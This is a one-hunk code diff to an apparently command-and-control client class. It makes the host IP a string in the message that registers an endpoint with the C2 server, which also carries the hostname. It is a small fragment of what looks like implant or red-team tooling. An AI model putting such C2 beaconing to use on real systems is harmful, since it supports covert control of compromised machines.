@@ -130,7 +130,7 @@ class C2Client:
         request = {}
         request["type"] = "client"
         request["action"] = "register_endpoint"
-        request["info"] = {"ip":self.src_ip, "hostname": self.hostname}
+        request["info"] = {"ip":str(self.src_ip), "hostname": self.hostname}
         self.endpoint_id = self.c2_server_transaction(server_message=request)
         logger.info(f"registered as {self.endpoint_id}")
 
